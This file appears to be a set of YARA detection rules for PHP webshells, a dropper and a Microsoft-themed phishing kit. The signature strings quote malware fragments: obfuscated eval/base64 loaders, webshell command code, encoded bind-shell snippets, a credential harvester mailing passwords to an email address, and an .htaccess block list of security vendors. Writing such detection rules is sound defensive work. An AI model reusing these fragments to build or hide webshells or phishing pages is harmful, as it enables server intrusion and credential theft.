   strings:
      $s1 = "}eval(fUUPd(\"jbvnzvTQep53AAZ8Dhs7BiKFjlmGFYISsAx772QUCKzD3nuQYw8/SY71x95+AWJAcnGVZz3lvvjO/OUvf/6KI+n+Lk3WAkf/OS+yMS/+7q+cNXXZIB" ascii
      $s2 = "mem6jtsrLme3rCe7MIRbKnbCG9d1D4zQJNbm55mOfP0cbhuFa1GgPf69XtJJA2mCN5zjyZ2WvMiGcPKyqBN1sr4RRMQs8dKNWGeGRfirUjuPTadvsv2EvKMMOo73O/32" ascii
      $s3 = "4IRdK1notSriswdU3U2QpbhUYmOsV03G2U5RMBg1QvGMyDbPjLFDMyGozySdOy/3b0GAz3+KTIz8os8utkP+pOIlIrqmg/2XDLLKoivK/YfIKzllcnZ3lByeanYISO25" ascii
      $s4 = "6se8QJAlNt7zEAQjrctGaxrzKruCiQUIMncx+GXvPZaD7Dbf+4nq3wxue23v2u0PQd62FunMSpymzKaFsms+6Qaa/H7jqU1WVthDfOOrbLF6rI4PHmr2tVlMQjT/mGTq" ascii
      $s5 = "Ijj7mna+vhgrqDQgRuxz6JsS4BKpWoAE3Hn6lkMUmz9rZE7XRUYvpzZxX5nikY+iuzPvt4aypPM0WcGWq07KE9d7LmN79Urxqntateu7HpcQBMjrOhRsc47qQ8xIFAke" ascii
      $s6 = "75cBcduQRynPQ//q//dCHUfzs+zF//81//y1///h/+43/4S3HV2z/85f/9y//5f/x/\"));?>" fullword ascii
      $s7 = "+XW6rn2JNH6tgzIIjFZ2Zl/t7jS0AHgeOqhqxKvZUetqf84GGPmrxlPQtEklK606+eZg0Qyq2hIPSGidi0N7FObAfRQaTMPQBIHUX7bJdYv1KmoMA+GweWfj+AbcXP5f" ascii
      $s8 = "gGwaIVx+3CMT/c8rHEN257IhBYWQnSE0QE+lyPopjzXggweKqCz6fTh07jCSPzNGcXvjuhCZiefeHQnJM6b3cQIupERgs9cpIDraLMpGjpFVyVW6B+rE/NRXRBfKeYIn" ascii
      $s9 = "7/6CcmDVZUup3tL/EIpDIOfmt5xnh6VHqt3J6SAZTZawduotbg1WeuebwSVoaR3Rkn1EtmieufZ15pfg2lwnHx8rssD3hQNizMFKVMaYRg2hbpFz8nSKFzXG94vAmGHo" ascii
      $s10 = "rQqLxBHcbWp5gt3BalunJ+wVS8CmD8ndUvA1Ngx305VDELV7/L8fA1eD1y5JAIZn0W05NeqbbLabZIMPBxzt+sJfZE7qsfIOCsKDLcXxvaj84I89+JQnwl3n3TdkNN9a" ascii
      $s11 = "WyQnCcT7vqEiF7UqqlMQU/Tsb8g/NAc1glTzwiH3r2z8FrosdktMD7p97hsq+kPDmRnjImnmdlvdZ+xl83qLvkmZ92iC0oQrQ81sY0UH0ny/Y8T17ujeQWCmDuDY3E43" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 70KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-15
   Identifier: case135
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_7409295928_WSO_generic {
   meta:
      description = "case135 - file 7409295928.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-15"
      hash1 = "b97d6507049bcde47cbe0666675abdb7159a519cbbe5fe97c282f4d6f9d59c16"
   strings:
      $s1 = "?php" ascii
      $s2 = "WSO" ascii
      $s3 = "urldecode" ascii
      //$s4 = "<?php /* WSO [2.6]  */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$GLOBALS['OOO0000O0']=$OOO0000" ascii
      $s5 = "$GLOBALS" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-28
   Identifier: shells
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_107_175_218_241_2018_10_14a_shells_dc3 {
   meta:
      description = "shells - file dc3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "3ace35f15c854f5e0183a17a38b7e6cafa2553a10c9e3b3fc5f7c06c2ef0f81e"
   strings:
      $x1 = "(){if(empty($_POST[\"ch\"]))$_POST[\"ch\"]=$GLOBALS[\"default\\137charset\"];global $_vza;echo\"<\\150tml><head><met\\x61 http-" ascii
      $s2 = "();}function acTiOnLogout(){SetCoOkIe($GLOBALS[\"coo\\153\"],\"\",TiME()-(int)round(1800+1800));die(\"bye!\");}function _" fullword ascii
      $s3 = "='Content-\\124ype' conte\\156t='\\164ext/h\\x74ml; c\\150\\141rset=\".$_POST[\"\\x63h\"].\"'><t\\151tle>\".$_SERVER[\"HTTP_HOST" ascii
      $s4 = "($_POST[\"p\"]).\" <span>\\117wner\\x2fGroup:</span>\\x20\".$_mkds[\"name\"].\"/\".$_ltxp[\"n\\141me\"].\"<br>\";echo\"<span>Cha" ascii
      $s5 = "lEmtIMe($_POST[\"p\"])).\"\\x22\\076<in\\160ut type=submi\\164 value=\\042>>\\042></f\\157r\\155>\";break;}echo\"</div>\";_" fullword ascii
      $s6 = "();}function ActiOnFt(){if(isset($_POST[\"p\"]))$_POST[\"p\"]=StR_rOT13(uRLdeCODE($_POST[\"p\"]));if(isset($_POST[\"x\"])){switc" ascii
      $s7 = "($_xw[\"size\"]):$_xw[\"type\"]).\"<\\x2ftd><td>\".$_xw[\"modify\"].\"</td><td>\".$_xw[\"owner\"].\"/\".$_xw[\"gr\\x6fup\"].\"</" ascii
      $s8 = "s\"],\"po\\163ix\\x5fgetgrgid\")===false)){function PoSIx_gETgRGid($_hp){return false;}}function _" fullword ascii
      $s9 = "66666666666667" ascii /* hex encoded string 'ffffffg' */
      $s10 = "666666666667" ascii /* hex encoded string 'fffffg' */
      $s11 = "6666666667" ascii /* hex encoded string 'ffffg' */
      $s12 = "$ps=\"de9\\x31\\070f6ea2e947\\x39ed9d81a814\\067\\144bae3d\";$_vza=\"#df5\";$_smp=\"fm\";$default_charset=\"Windows-1\\06251\";i" ascii
      $s13 = "($_ioko){if(fUnCTIOn_ExiSts(\"scandi\\x72\")){return scAnDir($_ioko);}else{$_ip=opeNdIr($_ioko);while(false!==($_io=rEadDir($_ip" ascii
      $s14 = "ed\");else echo\"unlink error\\x21\";if($_POST[\"p\"]!=\"yes\")_" fullword ascii
      $s15 = "(FIlESizE($_POST[\"p\"])):\"-\").\"\\040<\\163\\160an>\\x50ermi\\163sion:<\\057span>\\040\"._" fullword ascii
      $s16 = "\\x2f\\x61\\x3e <span>Dat\\145ti\\x6de:</span> \".daTE(\"Y-m-d H:i:s\").\"<br\\x3e\".($_jl?_" fullword ascii
      $s17 = "($_xw);else @Unlink($_xw);}break;}if($_rdbd)ToUCh($_POST[\"c\"],$_rdbd,$_rdbd);}_" fullword ascii
      $s18 = "7=3 \\x63ellsp\\141cing=0 width=100%><tr>\".$_ubi.\"</tr><\\x2ft\\141ble><\\x64iv style=\\x22margin:5\\042>\";}function _" fullword ascii
      $s19 = "(isset($_POST[\"c\"])?$_POST[\"c\"]:$GLOBALS[\"c\\167d\"]);if($_zka===false){echo\"Can't \\157pen this\\040folder!\";_" fullword ascii
      $s20 = "d(0+0+0),-154+157);if(isset($_POST[\"ps\"])&&(md5($_POST[\"ps\"])==$ps))_" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 80KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_107_175_218_241_2018_10_14a_shells_dropper {
   meta:
      description = "shells - file dropper.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "926034e2fbffb5bbf065c983bb74020fed3db9a8b0c55860df066385a7c0af2b"
   strings:
      $s1 = "MRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8Yj5VcGxvYWQgQ29tcGxhdGUgISEhPC9iPjxicj4nOyB9IGVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InB" ascii /* base64 encoded string 'ES['file']['name'])) { echo '<b>Upload Complate !!!</b><br>'; } echo '<form action="" method="p' */
      $s2 = "vc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IHR5cGU9InN1Ym1pdCI" ascii /* base64 encoded string 'st" enctype="multipart/form-data"><input type="file" name="file" size="50"><input type="submit"' */
      $s3 = "file_put_contents($fileName, base64_decode($fileData));" fullword ascii
      $s4 = "$fileName = 'sessions.php';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_107_175_218_241_2018_10_14a_shells_wso {
   meta:
      description = "shells - file wso.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "0238dd8da8ae85deb84fe18d1fa5df6673f500554fd4a83bd48d6633f600e8d3"
   strings:
      $s1 = "$cook = suBstR(Md5($_SERVER[\"HTTP_HOST\"]), (int) round(0 + 0 + 0), -154 + 157);" fullword ascii
      $s2 = "for ($_wvlc = StRLEn($_POST[\"s\"]) - (int) round(0.5 + 0.5); $_wvlc >= (int) round(0 + 0); --$_wvlc) {" fullword ascii
      $s3 = "$_dghz += (int) $_POST[\"s\"][$_wvlc] * poW(-5 - -13, StrLEn($_POST[\"s\"]) - $_wvlc - (-37 + 38));" fullword ascii
      $s4 = "echo \"<script>s_=\\\"\\\";</script><form onsubmit=\\\"g(null,null,'\" . uRLeNCOde(STR_roT13($_POST[\"p\"])) . \"',null,this.to" fullword ascii
      $s5 = "echo \"<script>s_=\\\"\\\";</script><form onsubmit=\\\"g(null,null,'\" . urlENCoDE(stR_Rot13($_POST[\"p\"])) . \"',null,this.ch" fullword ascii
      $s6 = "die(\"<form method=post><input type=password name=ps><input type=submit value='>>'></form>\");" fullword ascii
      $s7 = "return strCMP(strtOlOweR($_av[$GLOBALS[\"sort\"][266 - -235 + -501]]), sTRtOLOWer($_wr[$GLOBALS[\"sort\"][-376 + 376]])) * (" fullword ascii
      $s8 = "echo \"<form onsubmit=\\\"g(null,null,'\" . UrlENCoDE(sTR_Rot13($_POST[\"p\"])) . \"',null,rot13(this.name.value));return f" fullword ascii
      $s9 = "echo \"<form onsubmit=\\\"g(null,null,'\" . UrLenCoDE(sTr_Rot13($_POST[\"p\"])) . \"',null,'1'+utoa(this.text.value));retur" fullword ascii
      $s10 = "if (@Preg_mATcH(\"/\" . join(\"|\", $_wejg) . \"/i\", $_SERVER[\"HTTP_USER_AGENT\"])) {" fullword ascii
      $s11 = "} elseif (($_hp & 8257 - 8400 - -8335) == (int) round(2730.6666666667 + 2730.6666666667 + 2730.6666666667)) {" fullword ascii
      $s12 = "$_wvlc .= $_hp & (int) round(4 + 4) ? $_hp & 1318 + -294 ? \"s\" : \"x\" : ($_hp & 1019 + 5 ? \"S\" : \"-\");" fullword ascii
      $s13 = "if ($cwd[stRLeN($cwd) - (int) round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)] != \"/\") {" fullword ascii
      $s14 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST[\"ch\"] . \"'><title>\" . $_SERVER[\"" ascii
      $s15 = "echo hTMLspECiaLcHARs(@fGeTS($_tdtc, 487 - 872 - -1409));" fullword ascii
      $s16 = "HEADer(\"Content-Disposition: attachment; filename=\" . BAsEnAme($_POST[\"p\"]));" fullword ascii
      $s17 = "die(\"<script>g(null,null,\\\"\" . UrLenCODe($_POST[\"s\"]) . \"\\\",null,\\\"\\\")</script>\");" fullword ascii
      $s18 = "echo HtmLsPeCIAlcHArS(@fgETS($_tdtc, 1218 + -194));" fullword ascii
      $s19 = "if (FunctioN_EXisTs(\"get_magic_quotes_gpc\") && FUncTion_ExISTs(\"array_map\") && FunctION_EXIsTs(\"stripslashes\")) {" fullword ascii
      $s20 = "if (!funCTIon_existS(\"posix_getpwuid\") && sTrPOS($GLOBALS[\"disable_functions\"], \"posix_getpwuid\") === false) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 90KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_107_175_218_241_2018_10_14a_shells_dc2 {
   meta:
      description = "shells - file dc2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "07f20c09a3b101ef7523ea996e2eb3f3e28d022dc8e966e497a3fb3efc22e302"
   strings:
      $s1 = "en0afpiOQ52UuurOpovfl7pj4pLK4k4IjCNghCQunCTLRY3u1DqzA3Ga0uYbgBQ9DPnYQEXecIGcObYp" fullword ascii
      $s2 = "tDEU6AwuJgUL+QanaAbcqH8JT2i9TxDPBLh9mgjMSk/YAqRW9qHi9jndQUwlnpTIRcVrHPzAyQqm5Zfg" fullword ascii
      $s3 = "$s6353 = $wxsE7559($AE1718(\"pX1Nb+PK0t5f4XDmHknXkizq05YsjT22PKMc2/IryXfOeceGQJGUxGOJ5CUpW3N8DWSTRTYBkkUQIPsA" fullword ascii
      $s4 = "5oonn/8pCmR36EYEKYXD6clqxbeATVH/9UriH/75vw==\")); print ($s6353);" fullword ascii
      $s5 = "$AE1718 = chr(98).\"a\".chr(115).\"\".chr(101).\"\\x364_d\\x65c\\x6F\\x64\".chr(101);" fullword ascii
      $s6 = "pXkzJiiBf7DZ0KBFmOHiFP89v7oGjvYDsH8VnszIKEYxHDPwH9OPAT9F74g2tAoj2M2RtWWDCcS6aOuz" fullword ascii
      $s7 = "92ZD26sf1ivNvRJ9rDQw+xzuYBdajLhsnxCCJuigsse/GdI3vkTAVt+GRMx9UN/j3zuQtMphtVpuyv9a" fullword ascii
      $s8 = "L3/r4gkOkGeCmdmIKPrh05GyKxxbr6SD0P/v0V10ElgchjXC+HBZzsv1sscjcsLpkuudgcPxeLQfn3YQ" fullword ascii
      $s9 = "<?php $wxsE7559 = chr(103).\"\\x7a\\x69\\x6e\\x66\".chr(108).\"\\x61te\";" fullword ascii
      $s10 = "2HRCrlJTkc6w8YhKYpA9sYbgC4Xs4wyEB8tXBtdCCgDbWAJHiRXi7/Tk7HZbr48wzRAJEYeSYVAnIWXR" fullword ascii
      $s11 = "sMQ//Jf/8N9FWsUTJ2Tkx5vZeOJzUfG1/Akc9t1XsfMx1m38EqkLgh/6kh+QpSG4ARP/565vnZgcSGYu" fullword ascii
      $s12 = "lU9tux3w1MwQH7B4jsl4m/6T//Vf+akg+ELCPEd0qfEaFcnsjBr5j1GjPHy+KEC0nmC9F6IIJfso+GOe" fullword ascii
      $s13 = "JiSdqve//+W/+m957Dpo+djB9LNvT/QPq356BcInaTJLKaxfpNLIsdaABdXLU7PQIkpg3gqR3mhTfalz" fullword ascii
      $s14 = "Ja2EI6nFO/vQiuHPB6v+tTW6/AZ8JUYXYKJDGjBM31bJatpB9Lo/ugzSgNigCrPus3//z6iG7d67IjHj" fullword ascii
      $s15 = "iI8iPPFHBoInzFX+gx70r07WFjdEZ+WyijPLMxrAlb7uJ+XEpDhVZjsbi/r/83LZpRnpYwMk6gjTGOWk" fullword ascii
      $s16 = "0/XJxPiUV/fV8m+u7eTVv6hF0W2hrO7beElheKtVK7tIfuqfnPX9PH2+3Tbq17fb6lwrV5R6pa5cueFt" fullword ascii
      $s17 = "r/RTVNs2DFmNa2CQePpCK+zCuuLnQim9mMq1zH97PywoYIS3lUZLjLLcpd46iYT4n//0X+R5PiKNKwmz" fullword ascii
      $s18 = "AEmSHWEc8l3bZCu2fyBKiT0mwwyXBXFKBfMoM9ZkuDn9HiMLbjrX+WSFTE5SuGzCfmhjScJN3qUjyj/o" fullword ascii
      $s19 = "g/HUHIzyoqCstjliR/QWPYBLK636y8FAzsjx0DtmJZ+br2kEKhmO4P4Q3C96Iaj7bPLBIdn8Al+z7A0W" fullword ascii
      $s20 = "M/4h5bE7K7xfY4iYFAPb1bqkXzREMrQ1jNLBrqvZyFhjafBMQGzRduedpqiapiGwTnfwVYFnl8moJROk" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 50KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-12
   Identifier: account
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */


rule infected_09_10_18_phishing_smartsheet_data {
   meta:
      description = "account - file data.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-12"
      hash1 = "dee2198836643c8f440533264b416e648d51badc106824cc770cb431e3f26b0b"
   strings:
      $s1 = "$message .= \"Password: \".$_POST['passwd'].\"\\n\";" fullword ascii
      $s2 = "$message .= \"Username: \".$_POST['login'].\"\\n\";" fullword ascii
      $s3 = "\"User-Agent: \".$browser.\"\\n\";" fullword ascii
      $s4 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s5 = "$recipient = \"johnwashington1960@gmail.com\";" fullword ascii
      $s6 = "} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { " fullword ascii
      $s7 = "//get user's ip address " fullword ascii
      $s8 = "$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; " fullword ascii
      $s9 = "$hostname = gethostbyaddr($ip);" fullword ascii
      $s10 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s11 = "if (mail($recipient,$subject,$message,$headers))" fullword ascii
      $s12 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s13 = "$message .= \"HostName : \".$hostname.\"\\n\";" fullword ascii
      $s14 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s15 = "header(\"Location: index3.php\");" fullword ascii
      $s16 = "$headers = \"From: OFFBox\";" fullword ascii
      $s17 = "if (!empty($_SERVER['HTTP_CLIENT_IP'])) { " fullword ascii
      $s18 = "$ip = $_SERVER['HTTP_CLIENT_IP']; " fullword ascii
      $s19 = "\"Country Code: {$geoplugin->countryCode}\\n\";" fullword ascii
      $s20 = "$message .= \"======================================\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_09_10_18_phishing_smartsheet_index3 {
   meta:
      description = "account - file index3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-12"
      hash1 = "58479bd9dd37fb60a285ce31e5a2917181a59b4c76cd8ab689da25cefd64cb85"
   strings:
      $x1 = "background: rgba(0, 0, 0, 0) url(\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6999.16/content/images//backgrounds/0" fullword ascii
      $s2 = "<meta http-equiv=\"refresh\" content=\"5;url=https://onedrive.live.com/\" />" fullword ascii
      $s3 = "TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);" fullword ascii
      $s4 = "<img src=\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6999.16/content/images/microsoft_logo.png\" id=\"IMG_12\" alt=''" ascii
      $s5 = "User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);" fullword ascii
      $s6 = "Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6999.16/content/images/default_signin_ill" ascii
      $s7 = "Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6999.16/content/images/default_signin_ill" ascii
      $s8 = "User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);" fullword ascii
      $s9 = "User.UpdateLogo('', \"You signed out of your account\", true);" fullword ascii
      $s10 = "background: rgba(0, 0, 0, 0) url(\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6999.16/content/images//backgrounds/0-sm" ascii
      $s11 = "background: rgba(0, 0, 0, 0) url(\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6999.16/content/images//backgrounds/0.jp" ascii
      $s12 = "Constants.DEFAULT_LOGO_ALT = 'Hang on a moment while we sign you out.';" fullword ascii
      $s13 = "document.cookie = \"SOS\" + \"=1; path=/\";" fullword ascii
      $s14 = "signoutStatusMessage.text(\"You may still be signed in to some applications. Close your browser to finish signing out.\");" fullword ascii
      $s15 = "<script type=\"text/javascript\" id=\"SCRIPT_2\">function SetImageStatus(imageIndex, status)" fullword ascii
      $s16 = "<script type=\"text/javascript\" id=\"SCRIPT_18\">$Do.when(\"doc.ready\", function ()" fullword ascii
      $s17 = "<script type=\"text/javascript\" id=\"SCRIPT_3\">var imageStatusArray = new Array(0);" fullword ascii
      $s18 = "Constants.DEFAULT_BOILERPLATE_HEADER = '';" fullword ascii
      $s19 = "signoutStatusMessage.text(\"It\\u0027s a good idea to close all browser windows.\");" fullword ascii
      $s20 = "Constants.BOILERPLATE_HEADER = '';" fullword ascii
   condition:
      ( uint16(0) == 0x733c and
         filesize < 60KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}


rule infected_09_10_18_phishing_smartsheet_htaccess {
   meta:
      description = "account - file .htaccess"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-12"
      hash1 = "797d267648e4045ac790950c234fc6f33d8c20ae51f8c4d6be1a233ab3684c05"
   strings:
      $s1 = "deny from blogger.com" fullword ascii
      $s2 = "deny from blogs.eset-la.com" fullword ascii
      $s3 = "deny from infospyware.com" fullword ascii
      $s4 = "deny from opera.com" fullword ascii
      $s5 = "deny from fireeye.com" fullword ascii
      $s6 = "Deny from morgue1.corp.yahoo.com" fullword ascii
      $s7 = "Deny from crawl8-public.alexa.com" fullword ascii
      $s8 = "deny from wilderssecurity.com" fullword ascii
      $s9 = "Deny from tracerlock.com" fullword ascii
      $s10 = "deny from malwaredomainlist.com" fullword ascii
      $s11 = "Deny from pixnat09.whizbang.com" fullword ascii
      $s12 = "deny from community.norton.com" fullword ascii
      $s13 = "deny from welivesecurity.com" fullword ascii
      $s14 = "deny from virustotal.com" fullword ascii
      $s15 = "deny from alienvault.com" fullword ascii
      $s16 = "deny from minotauranalysis.com" fullword ascii
      $s17 = "Deny from pixnat06.whizbang.com" fullword ascii
      $s18 = "Deny from hanta.yahoo.com" fullword ascii
      $s19 = "deny from gdatasoftware.com" fullword ascii
      $s20 = "Deny from zeus.nj.nec.com" fullword ascii
   condition:
      ( uint16(0) == 0x6564 and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-02
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_02_18_shell_solus {
   meta:
      description = "shell1 - file solus.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-02"
      hash1 = "99f3776c10f35ebcf6729e346ee2d655aabbdebc494757fc3c6f8a5880f91dbc"
   strings:
      $s1 = "pdD1cJ2cobnVsbCxudWxsLCIxIix0aGlzLnBhcmFtLnZhbHVlKTtyZXR1cm4gZmFsc2U7XCc+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN" ascii /* base64 encoded string 't=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=s' */
      $s2 = "lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48YnI+PHNwYW4+UG9zaXhfZ2V0cHd1aWQgKCJSZWFkIiAvZXRjL3Bhc3N3ZCk8L3NwYW4" ascii /* base64 encoded string '=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span' */
      $s3 = "wdGZVMVJTUlVGTkxHZGxkSEJ5YjNSdllubHVZVzFsS0NkMFkzQW5LU2tnZkh3Z1pHbGxJQ0pEWVc1MElHTnlaV0YwWlNCemIyTnJaWFJjYmlJN0RRcHpaWFJ6YjJOcmI" ascii /* base64 encoded string 'tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb' */
      $s4 = "eval(\"?>\".base64_decode(\"PD9waHANCg0KDQokY29sb3IgPSAiI0ZFQ0QwMSI7DQokZGVmYXVsdF9hY3Rpb24gPSAnRmlsZXNNYW4nOw0KQGRlZmluZSgnU0VM" ascii
      $s5 = "xS1RzTkNpQWdJQ0IzYUdsc1pTZ3hLU0I3RFFvZ0lDQWdJQ0FnSUdNOVlXTmpaWEIwS0hNc01Dd3dLVHNOQ2lBZ0lDQWdJQ0FnWkhWd01paGpMREFwT3cwS0lDQWdJQ0F" ascii /* base64 encoded string 'KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICA' */
      $s6 = "uYW1lJ10uIjwvdGQ+PHRkPjxhIGhyZWY9J3N5bS9yb290L2hvbWUvIi4kdXNlclsnbmFtZSddLiIvcHVibGljX2h0bWwnIHRhcmdldD0nX2JsYW5rJz5zeW1saW5rIDw" ascii /* base64 encoded string 'ame']."</td><td><a href='sym/root/home/".$user['name']."/public_html' target='_blank'>symlink <' */
      $s7 = "+PHRkPiIuJGNvdW50KysuIjwvdGQ+PHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPWh0dHA6Ly8iLiRkLicvPicuJGRkdC4nIDwvYT48L3RkPjx0ZD4nLiR1c2VyWyd" ascii /* base64 encoded string '<td>".$count++."</td><td><a target='_blank' href=http://".$d.'/>'.$ddt.' </a></td><td>'.$user['' */
      $s8 = "0ck91dHB1dCcpLnN0eWxlLmRpc3BsYXk9Jyc7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N0ck91dHB1dCcpLmlubmVySFRNTD0nIi5hZGRjc2xhc2hlcyhodG1sc3B" ascii /* base64 encoded string 'rOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlsp' */
      $s9 = "rYng+PC90ZD48dGQ+PGEgaHJlZj0jIG9uY2xpY2s9IicuKCgkZlsndHlwZSddPT0nZmlsZScpPydnKFwnRmlsZXNUb29sc1wnLG51bGwsXCcnLnVybGVuY29kZSgkZls" ascii /* base64 encoded string 'bx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f[' */
      $s10 = "vU1U1QlJFUlNYMEZPV1NrN0RRb2dJQ0FnWW1sdVpDaHpMQ0FvYzNSeWRXTjBJSE52WTJ0aFpHUnlJQ29wSm5Jc0lEQjRNVEFwT3cwS0lDQWdJR3hwYzNSbGJpaHpMQ0E" ascii /* base64 encoded string 'SU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA' */
      $s11 = "XOXdaVzRnVTFSRVJWSlNMQ0krSmtOUFRrNGlPdzBLQ1FsbGVHVmpJQ1JUU0VWTVRDQjhmQ0JrYVdVZ2NISnBiblFnUTA5T1RpQWlRMkZ1ZENCbGVHVmpkWFJsSUNSVFN" ascii /* base64 encoded string '9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTS' */
      $s12 = "2YWx1ZSk7aWYodGhpcy5hamF4LmNoZWNrZWQpe2EobnVsbCxudWxsLHRoaXMuY21kLnZhbHVlKTt9ZWxzZXtnKG51bGwsbnVsbCx0aGlzLmNtZC52YWx1ZSk7fSByZXR" ascii /* base64 encoded string 'alue);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} ret' */
      $s13 = "uY2xpY2s9ImcoXCdQaHBcJyxudWxsLG51bGwsXCdpbmZvXCcpIj5bIHBocGluZm8gXTwvYT48YnIgLz46ICcuKCRHTE9CQUxTWydzYWZlX21vZGUnXT8nPGZvbnQgY29" ascii /* base64 encoded string 'click="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a><br />: '.($GLOBALS['safe_mode']?'<font co' */
      $s14 = "9Y2htb2QgdmFsdWU9Iicuc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRfUE9TVFsncDEnXSkpLC00KS4nIj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4" ascii /* base64 encoded string 'chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">' */
      $s15 = "yZ2dMV2tpT3cwS2FXWWdLRUJCVWtkV0lEd2dNU2tnZXlCbGVHbDBLREVwT3lCOURRcDFjMlVnVTI5amEyVjBPdzBLYzI5amEyVjBLRk1zSmxCR1gwbE9SVlFzSmxOUFE" ascii /* base64 encoded string 'ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ' */
